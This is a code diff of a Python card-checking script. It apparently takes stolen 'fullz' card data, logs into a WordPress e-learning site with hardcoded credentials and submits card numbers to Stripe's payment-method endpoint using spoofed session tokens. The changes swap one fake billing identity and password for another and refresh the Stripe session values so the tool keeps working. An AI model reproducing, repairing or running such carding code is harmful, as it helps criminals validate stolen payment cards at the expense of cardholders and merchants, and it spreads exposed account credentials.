@@ -113,8 +113,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         data = {
             'learndash-login-form': login,
             'pmpro_login_form_used': '1',
-            'log': 'senryjo@onionmail.org',
-            'pwd': 'Senryjo123789@',
+            'log': 'rensen89@gmail.com',
+            'pwd': 'Rensen89',
             'wp-submit': 'Log In',
             'redirect_to': '',
         }
@@ -198,19 +198,19 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
 
         data = {
             'type':'card',
-            'billing_details[name]':'senry joshua',
-            'billing_details[email]':'senryjo@onionmail.org',
+            'billing_details[name]':'rena senoman',
+            'billing_details[email]':'rensen89@gmail.com',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
-            'guid':'70a2e756-b5bf-4236-9956-f42eeb07c5b8273a5f',
+            'guid':'e449b162-3515-4886-87fa-abb185bba5ef094143',
             'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
-            'sid':'992dc1bf-9086-4997-865a-76988ba5154f55d68f',
-            'payment_user_agent':'stripe.js/399197339e; stripe-js-v3/399197339e; split-card-element',
+            'sid':'e111c2c6-927f-42ce-af16-8c70358cf59a6dea3e',
+            'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
             'referrer':'https://elearntsg.com',
-            'time_on_page':'116708',
-            'client_attribution_metadata[client_session_id]':'36f62d63-5d9d-488b-beba-353f4cae2228',
+            'time_on_page':'116734',
+            'client_attribution_metadata[client_session_id]':'02c69dec-7a68-4d1c-96eb-00b43ee46be0',
             'client_attribution_metadata[merchant_integration_source]':'elements',
             'client_attribution_metadata[merchant_integration_subtype]':'card-element',
             'client_attribution_metadata[merchant_integration_version]':'2017',
@@ -569,4 +569,3 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
